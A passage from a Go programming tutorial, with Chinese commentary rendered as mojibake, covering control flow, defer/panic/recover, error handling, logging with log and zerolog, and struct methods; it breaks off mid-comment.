<h3 id="æµç¨‹æ§åˆ¶è¯­å¥"><a href="#æµç¨‹æ§åˆ¶è¯­å¥" class="headerlink" title="æµç¨‹æ§åˆ¶è¯­å¥"></a>æµç¨‹æ§åˆ¶è¯­å¥</h3><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><p>ifæ¡ä»¶è¡¨è¾¾å¼å¯ä»¥ä¸å¸¦å°æ‹¬å·</p>
<p>ä½†æ˜¯å¤§æ‹¬å·ä¸èƒ½çœç•¥        </p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">somenumber</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-7</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> num := somenumber(); num &lt; <span class="number">0</span> &#123;</span><br><span class="line">        fmt.Println(num, <span class="string">&quot;is negative&quot;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> num &lt; <span class="number">10</span> &#123;</span><br><span class="line">        fmt.Println(num, <span class="string">&quot;has 1 digit&quot;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        fmt.Println(num, <span class="string">&quot;has multiple digits&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//è¿™é‡Œä¼šæŠ¥é”™ï¼Œå› ä¸ºåœ¨ifè¯­å¥å—ä¸­å®šä¹‰çš„å˜é‡åªèƒ½åœ¨ifè¯­å¥èŒƒå›´ä¸­ä½¿ç”¨ï¼Œè¶…è¿‡èŒƒå›´ä¼šæŠ¥é”™</span></span><br><span class="line">    fmt.Println(num)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h4><p>åœ¨ Go ä¸­ï¼Œå½“é€»è¾‘è¿›å…¥æŸä¸ª case æ—¶ï¼Œå®ƒä¼šé€€å‡º <code>switch</code> å—ï¼ˆæ»¡è¶³æ¡ä»¶åé€€å‡ºswitchå—ï¼‰ï¼Œé™¤éä½ æ˜¾å¼åœæ­¢å®ƒã€‚ </p>
<p>è‹¥è¦ä½¿é€»è¾‘è¿›å…¥åˆ°ä¸‹ä¸€ä¸ªç´§é‚»çš„ caseï¼Œè¯·ä½¿ç”¨ <code>fallthrough</code> å…³é”®å­—ã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> num := <span class="number">15</span>; &#123;</span><br><span class="line">       <span class="comment">//case å¯ä»¥ç¼–å†™æ¡ä»¶</span></span><br><span class="line">    <span class="keyword">case</span> num &lt; <span class="number">50</span>:</span><br><span class="line">        fmt.Printf(<span class="string">&quot;%d is less than 50\n&quot;</span>, num)</span><br><span class="line">        <span class="keyword">fallthrough</span></span><br><span class="line">    <span class="keyword">case</span> num &gt; <span class="number">100</span>:</span><br><span class="line">        fmt.Printf(<span class="string">&quot;%d is greater than 100\n&quot;</span>, num)</span><br><span class="line">        <span class="keyword">fallthrough</span></span><br><span class="line">    <span class="keyword">case</span> num &lt; <span class="number">200</span>:</span><br><span class="line">        fmt.Printf(<span class="string">&quot;%d is less than 200&quot;</span>, num)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œä»£ç å¹¶åˆ†æè¾“å‡ºï¼š</p>
<p>è¾“å‡º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">15 is less than 50</span><br><span class="line">15 is greater than 100</span><br><span class="line">15 is less than 200</span><br></pre></td></tr></table></figure>

<p>ä½ æ˜¯å¦çœ‹åˆ°é”™è¯¯ï¼Ÿ</p>
<p><strong>è¯·æ³¨æ„ï¼Œç”±äº <code>num</code> ä¸º 15ï¼ˆå°äº 50ï¼‰ï¼Œå› æ­¤å®ƒä¸ç¬¬ä¸€ä¸ª case åŒ¹é…ã€‚ ä½†æ˜¯ï¼Œ<code>num</code> ä¸å¤§äº 100ã€‚ ç”±äºç¬¬ä¸€ä¸ª <code>case</code> è¯­å¥åŒ…å« <code>fallthrough</code> å…³é”®å­—ï¼Œå› æ­¤é€»è¾‘ä¼šç«‹å³è½¬åˆ°ä¸‹ä¸€ä¸ª <code>case</code> è¯­å¥ï¼Œè€Œä¸ä¼šå¯¹è¯¥ case è¿›è¡ŒéªŒè¯ã€‚ å› æ­¤ï¼Œåœ¨ä½¿ç”¨ <code>fallthrough</code> å…³é”®å­—æ—¶å¿…é¡»è°¨æ…ã€‚ è¯¥ä»£ç äº§ç”Ÿçš„è¡Œä¸ºå¯èƒ½ä¸æ˜¯ä½ æƒ³è¦çš„ã€‚</strong></p>
<h4 id="for"><a href="#for" class="headerlink" title="for"></a>for</h4><p>æœ€ç®€ä¾‹å­</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    sum := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">100</span>; i++ &#123;</span><br><span class="line">        sum += i</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(<span class="string">&quot;sum of 1..100 is&quot;</span>, sum)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>éšæœºæ•°äº§ç”Ÿ</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math/rand&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> num <span class="keyword">int32</span></span><br><span class="line">	sec := time.Now().Unix()</span><br><span class="line">	rand.Seed(sec)</span><br><span class="line">    <span class="comment">//ç­‰äºwhile(1)</span></span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		fmt.Print(<span class="string">&quot;Writting inside the loop...&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> num = rand.Int31n(<span class="number">10</span>); num == <span class="number">5</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;finish!&quot;</span>)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Println(num)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>continueä¸­è§„ä¸­çŸ©æ²¡å•¥åŒºåˆ«</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    sum := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> num := <span class="number">1</span>; num &lt;= <span class="number">100</span>; num++ &#123;</span><br><span class="line">        <span class="keyword">if</span> num%<span class="number">5</span> == <span class="number">0</span> &#123;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        sum += num</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(<span class="string">&quot;The sum of 1 to 100, but excluding numbers divisible by 5, is&quot;</span>, sum)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="defer-panic-recover"><a href="#defer-panic-recover" class="headerlink" title="defer panic recover"></a>defer panic recover</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">highlow</span><span class="params">(high <span class="keyword">int</span>, low <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> high &lt; low &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;Panic!&quot;</span>)</span><br><span class="line"><span class="comment">// panicå¯ä»¥ç†è§£æˆthrowä¸€ä¸ªå¼‚å¸¸</span></span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">&quot;highlow() low greater than high&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//deferç†è§£æˆä¸€ä¸ªå †æ ˆï¼Œä¼šåœ¨ç»“æŸçš„æ—¶å€™é€†å‘é‡æ–°æ‰§è¡Œè¿è¡Œ</span></span><br><span class="line">	<span class="keyword">defer</span> fmt.Println(<span class="string">&quot;Deferred: highlow(&quot;</span>, high, <span class="string">&quot;,&quot;</span>, low, <span class="string">&quot;)&quot;</span>)</span><br><span class="line">	fmt.Println(<span class="string">&quot;Call: highlow(&quot;</span>, high, <span class="string">&quot;,&quot;</span>, low, <span class="string">&quot;)&quot;</span>)</span><br><span class="line"></span><br><span class="line">	highlow(high, low+<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		handler := <span class="built_in">recover</span>()</span><br><span class="line">        <span class="comment">//recoverå¯ä»¥ç†è§£æˆcatchå¼‚å¸¸çš„ä¿¡æ¯ï¼Œä¸æ˜¾ç¤ºå…·ä½“çš„å †æ ˆè·Ÿè¸ª</span></span><br><span class="line">		<span class="comment">//å¦‚æœæ²¡æœ‰ä»»ä½•é”™è¯¯æ•æ‰åˆ°ä¼šè¿”å›nil</span></span><br><span class="line">        <span class="keyword">if</span> handler != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;main(): recover&quot;</span>, handler)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;()</span><br><span class="line">	highlow(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">	fmt.Println(<span class="string">&quot;Program finished successfully!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Call: highlow( 2 , 0 )</span><br><span class="line">Call: highlow( 2 , 1 )</span><br><span class="line">Call: highlow( 2 , 2 )</span><br><span class="line">Panic!</span><br><span class="line">Deferred: highlow( 2 , 2 )</span><br><span class="line">Deferred: highlow( 2 , 1 )</span><br><span class="line">Deferred: highlow( 2 , 0 )</span><br><span class="line">main(): recover highlow() low greater than high</span><br></pre></td></tr></table></figure>



<h3 id="é”™è¯¯å¤„ç†"><a href="#é”™è¯¯å¤„ç†" class="headerlink" title="é”™è¯¯å¤„ç†"></a>é”™è¯¯å¤„ç†</h3><h4 id="é”™è¯¯å¤„ç†ç­–ç•¥"><a href="#é”™è¯¯å¤„ç†ç­–ç•¥" class="headerlink" title="é”™è¯¯å¤„ç†ç­–ç•¥"></a>é”™è¯¯å¤„ç†ç­–ç•¥</h4><p>å½“å‡½æ•°è¿”å›é”™è¯¯æ—¶ï¼Œè¯¥é”™è¯¯é€šå¸¸æ˜¯æœ€åä¸€ä¸ªè¿”å›å€¼ã€‚ æ­£å¦‚ä¸Šä¸€éƒ¨åˆ†æ‰€ä»‹ç»çš„é‚£æ ·ï¼Œè°ƒç”¨æ–¹è´Ÿè´£æ£€æŸ¥æ˜¯å¦å­˜åœ¨é”™è¯¯å¹¶å¤„ç†é”™è¯¯ã€‚ å› æ­¤ï¼Œä¸€ä¸ªå¸¸è§ç­–ç•¥æ˜¯ç»§ç»­ä½¿ç”¨è¯¥æ¨¡å¼åœ¨å­ä¾‹ç¨‹ä¸­ä¼ æ’­é”™è¯¯ã€‚ ä¾‹å¦‚ï¼Œå­ä¾‹ç¨‹ï¼ˆå¦‚ä¸Šä¸€ç¤ºä¾‹ä¸­çš„ <code>getInformation</code>ï¼‰å¯èƒ½ä¼šå°†é”™è¯¯è¿”å›ç»™è°ƒç”¨æ–¹ï¼Œè€Œä¸æ‰§è¡Œå…¶ä»–ä»»ä½•æ“ä½œï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getInformation</span><span class="params">(id <span class="keyword">int</span>)</span> <span class="params">(*Employee, error)</span></span> &#123;</span><br><span class="line">    employee, err := apiCallEmployee(<span class="number">1000</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err <span class="comment">// Simply return the error to the caller.</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> employee, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½ å¯èƒ½è¿˜éœ€è¦åœ¨ä¼ æ’­é”™è¯¯ä¹‹å‰æ·»åŠ æ›´å¤šä¿¡æ¯ã€‚ ä¸ºæ­¤ï¼Œå¯ä»¥ä½¿ç”¨ <code>fmt.Errorf()</code> å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¸æˆ‘ä»¬ä¹‹å‰çœ‹åˆ°çš„å‡½æ•°ç±»ä¼¼ï¼Œä½†å®ƒè¿”å›ä¸€ä¸ªé”™è¯¯ã€‚ ä¾‹å¦‚ï¼Œä½ å¯ä»¥å‘é”™è¯¯æ·»åŠ æ›´å¤šä¸Šä¸‹æ–‡ï¼Œä½†ä»è¿”å›åŸå§‹é”™è¯¯ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getInformation</span><span class="params">(id <span class="keyword">int</span>)</span> <span class="params">(*Employee, error)</span></span> &#123;</span><br><span class="line">    employee, err := apiCallEmployee(<span class="number">1000</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;Got an error when getting the employee information: %v&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> employee, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦ä¸€ç§ç­–ç•¥æ˜¯åœ¨é”™è¯¯ä¸ºæš‚æ—¶æ€§é”™è¯¯æ—¶è¿è¡Œé‡è¯•é€»è¾‘ã€‚ ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨é‡è¯•ç­–ç•¥è°ƒç”¨å‡½æ•°ä¸‰æ¬¡å¹¶ç­‰å¾…ä¸¤ç§’é’Ÿï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getInformation</span><span class="params">(id <span class="keyword">int</span>)</span> <span class="params">(*Employee, error)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> tries := <span class="number">0</span>; tries &lt; <span class="number">3</span>; tries++ &#123;</span><br><span class="line">        employee, err := apiCallEmployee(<span class="number">1000</span>)</span><br><span class="line">        <span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> employee, <span class="literal">nil</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        fmt.Println(<span class="string">&quot;Server is not responding, retrying ...&quot;</span>)</span><br><span class="line">        time.Sleep(time.Second * <span class="number">2</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;server has failed to respond to get the employee information&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ€åï¼Œå¯ä»¥è®°å½•é”™è¯¯å¹¶å¯¹æœ€ç»ˆç”¨æˆ·éšè—ä»»ä½•å®ç°è¯¦ç»†ä¿¡æ¯ï¼Œè€Œä¸æ˜¯å°†é”™è¯¯æ‰“å°åˆ°æ§åˆ¶å°ã€‚ æˆ‘ä»¬å°†åœ¨ä¸‹ä¸€æ¨¡å—ä»‹ç»æ—¥å¿—è®°å½•ã€‚ ç°åœ¨ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•åˆ›å»ºå’Œä½¿ç”¨è‡ªå®šä¹‰é”™è¯¯ã€‚</p>
<h4 id="åˆ›å»ºå¯é‡ç”¨çš„é”™è¯¯"><a href="#åˆ›å»ºå¯é‡ç”¨çš„é”™è¯¯" class="headerlink" title="åˆ›å»ºå¯é‡ç”¨çš„é”™è¯¯"></a>åˆ›å»ºå¯é‡ç”¨çš„é”™è¯¯</h4><p>æœ‰æ—¶é”™è¯¯æ¶ˆæ¯æ•°ä¼šå¢åŠ ï¼Œä½ éœ€è¦ç»´æŒç§©åºã€‚ æˆ–è€…ï¼Œä½ å¯èƒ½éœ€è¦ä¸ºè¦é‡ç”¨çš„å¸¸è§é”™è¯¯æ¶ˆæ¯åˆ›å»ºä¸€ä¸ªåº“ã€‚ åœ¨ Go ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨ <code>errors.New()</code> å‡½æ•°åˆ›å»ºé”™è¯¯å¹¶åœ¨è‹¥å¹²éƒ¨åˆ†ä¸­é‡å¤ä½¿ç”¨è¿™äº›é”™è¯¯ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å®šä¹‰é”™è¯¯å˜é‡</span></span><br><span class="line"><span class="keyword">var</span> ErrNotFound = errors.New(<span class="string">&quot;Employee not found!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getInformation</span><span class="params">(id <span class="keyword">int</span>)</span> <span class="params">(*Employee, error)</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> id != <span class="number">1001</span> &#123;</span><br><span class="line">        <span class="comment">//ä½¿ç”¨é”™è¯¯å˜é‡</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, ErrNotFound</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    employee := Employee&#123;LastName: <span class="string">&quot;Doe&quot;</span>, FirstName: <span class="string">&quot;John&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> &amp;employee, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>getInformation</code> å‡½æ•°çš„ä»£ç å¤–è§‚æ›´ä¼˜ç¾ï¼Œè€Œä¸”å¦‚æœéœ€è¦æ›´æ”¹é”™è¯¯æ¶ˆæ¯ï¼Œåªéœ€åœ¨ä¸€ä¸ªä½ç½®æ›´æ”¹å³å¯ã€‚ å¦è¯·æ³¨æ„ï¼Œæƒ¯ä¾‹æ˜¯ä¸ºé”™è¯¯å˜é‡æ·»åŠ  <code>Err</code> å‰ç¼€ã€‚</p>
<p>æœ€åï¼Œå¦‚æœä½ å…·æœ‰é”™è¯¯å˜é‡ï¼Œåˆ™åœ¨å¤„ç†è°ƒç”¨æ–¹å‡½æ•°ä¸­çš„é”™è¯¯æ—¶å¯ä»¥æ›´å…·ä½“ã€‚ <code>errors.Is()</code> å‡½æ•°å…è®¸ä½ æ¯”è¾ƒè·å¾—çš„é”™è¯¯çš„ç±»å‹ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">employee, err := getInformation(<span class="number">1000</span>)</span><br><span class="line"><span class="comment">//errors.Isæ¯”è¾ƒé”™è¯¯ç±»å‹ç„¶åè¡¥å……é”™è¯¯è¾“å‡º</span></span><br><span class="line"><span class="keyword">if</span> errors.Is(err, ErrNotFound) &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;NOT FOUND: %v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    fmt.Print(employee)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>ä½ è¿˜éœ€è¦äº†è§£ä½•æ—¶ä½¿ç”¨ panicã€‚ æˆ‘ä»¬å·²ä»‹ç» <code>panic</code> å’Œ <code>recover</code> çš„å·¥ä½œåŸç†ã€‚ ä»…å½“æ˜ç¡®éœ€è¦åœæ­¢ç¨‹åºæ—¶ï¼Œæ‰åº”ä½¿ç”¨è¿™äº›å‡½æ•°ã€‚ æœ‰æ—¶ï¼Œå³ä½¿ä½ æ­£ç¡®å¤„ç†äº†é”™è¯¯ï¼Œç¨‹åºä¹Ÿå¯èƒ½ä¼šåœæ­¢å“åº”ã€‚ ä½†è¿™åº”è¯¥æ˜¯å¼‚å¸¸ï¼Œè€Œä¸æ˜¯è§„åˆ™ã€‚</p>
<h3 id="log"><a href="#log" class="headerlink" title="log"></a>log</h3><h4 id="logåŒ…"><a href="#logåŒ…" class="headerlink" title="logåŒ…"></a>logåŒ…</h4><ul>
<li>fatal</li>
<li>print</li>
<li>painc</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    log.Print(<span class="string">&quot;Hey, I&#x27;m a log!&quot;</span>)</span><br><span class="line">    <span class="comment">//log.SetPrefix()ã€‚ å¯ä½¿ç”¨å®ƒå‘ç¨‹åºçš„æ—¥å¿—æ¶ˆæ¯æ·»åŠ å‰ç¼€</span></span><br><span class="line">    log.SetPrefix(<span class="string">&quot;main(): &quot;</span>)</span><br><span class="line">    <span class="comment">//ä½ å¯ä»¥ä½¿ç”¨ log.Fatal() å‡½æ•°è®°å½•é”™è¯¯å¹¶ç»“æŸç¨‹åºï¼Œå°±åƒä½¿ç”¨ os.Exit(1) ä¸€æ ·ã€‚</span></span><br><span class="line">    log.Fatal(<span class="string">&quot;Hey, I&#x27;m an error log!&quot;</span>)</span><br><span class="line">    <span class="comment">//  åœ¨ä½¿ç”¨ log.Panic() å‡½æ•°æ—¶ä¼šå‡ºç°ç±»ä¼¼è¡Œä¸ºï¼Œè¯¥å‡½æ•°ä¹Ÿè°ƒç”¨ panic() å‡½æ•°</span></span><br><span class="line">    log.Panic(<span class="string">&quot;Hey, I&#x27;m an error log!&quot;</span>)</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">2021</span>/<span class="number">10</span>/<span class="number">18</span> <span class="number">09</span>:<span class="number">59</span>:<span class="number">58</span> Hey, I<span class="string">&#x27;m a log!</span></span><br><span class="line"><span class="string">main(): 2021/10/18 09:59:58 Hey, I&#x27;</span>m an error log!</span><br><span class="line">exit status <span class="number">1</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>è®°å½•åˆ°æ–‡ä»¶</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    file, err := os.OpenFile(<span class="string">&quot;info.log&quot;</span>, os.O_CREATE|os.O_APPEND|os.O_WRONLY, <span class="number">0644</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">defer</span> file.Close()</span><br><span class="line"></span><br><span class="line">    log.SetOutput(file)</span><br><span class="line">    log.Print(<span class="string">&quot;Hey, I&#x27;m a log!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="zerolog"><a href="#zerolog" class="headerlink" title="zerolog"></a>zerolog</h4><p>é‡æ„ä¾èµ–<code>go mod tidy</code></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;github.com/rs/zerolog&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/rs/zerolog/log&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    zerolog.TimeFieldFormat = zerolog.TimeFormatUnix</span><br><span class="line">    log.Print(<span class="string">&quot;Hey! I&#x27;m a log message!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p>å¦ä¸€æœ‰ç”¨åŠŸèƒ½æ˜¯ä½ å¯ä»¥å¿«é€Ÿæ·»åŠ ä¸Šä¸‹æ–‡æ•°æ®ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<p>Go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;github.com/rs/zerolog&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/rs/zerolog/log&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    zerolog.TimeFieldFormat = zerolog.TimeFormatUnix</span><br><span class="line"></span><br><span class="line">    log.Debug().</span><br><span class="line">        Int(<span class="string">&quot;EmployeeID&quot;</span>, <span class="number">1001</span>).</span><br><span class="line">        Msg(<span class="string">&quot;Getting employee information&quot;</span>)</span><br><span class="line"></span><br><span class="line">    log.Debug().</span><br><span class="line">        Str(<span class="string">&quot;Name&quot;</span>, <span class="string">&quot;John&quot;</span>).</span><br><span class="line">        Send()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå‰é¢çš„ä»£ç æ—¶ï¼Œå°†çœ‹åˆ°ä»¥ä¸‹è¾“å‡ºï¼š</p>
<p>è¾“å‡º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;level&quot;:&quot;debug&quot;,&quot;EmployeeID&quot;:1001,&quot;time&quot;:1609855731,&quot;message&quot;:&quot;Getting employee information&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;debug&quot;,&quot;Name&quot;:&quot;John&quot;,&quot;time&quot;:1609855731&#125;</span><br></pre></td></tr></table></figure>

<h3 id="method-oop"><a href="#method-oop" class="headerlink" title="method(oop)"></a>method(oop)</h3><p>usageï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(variable <span class="keyword">type</span>)</span> <span class="title">MethodName</span><span class="params">(parameters ...)</span></span> &#123;</span><br><span class="line">    <span class="comment">// method functionality</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>ä¾‹å­</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> triangle <span class="keyword">struct</span> &#123;</span><br><span class="line">	size <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> coloredTriangle <span class="keyword">struct</span> &#123;</span><br><span class="line">	triangle</span><br><span class="line">	color <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> square <span class="keyword">struct</span> &#123;</span><br><span class="line">	size <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ–¹æ³•å¯¹äºgoæ¥è¯´å°±æ˜¯ç‰¹æ®Šçš„ä¸€ä¸ªå‡½æ•°ï¼Œå³å‡½æ•°åä¹‹å‰æœ‰ä¸€ä¸ªæ‹¬å·é‡Œæ³¨æ˜å±äºçš„ç»“æ„ä½“(å¯¹è±¡)</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t triangle)</span> <span class="title">perimeter</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> t.size * <span class="number">3</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 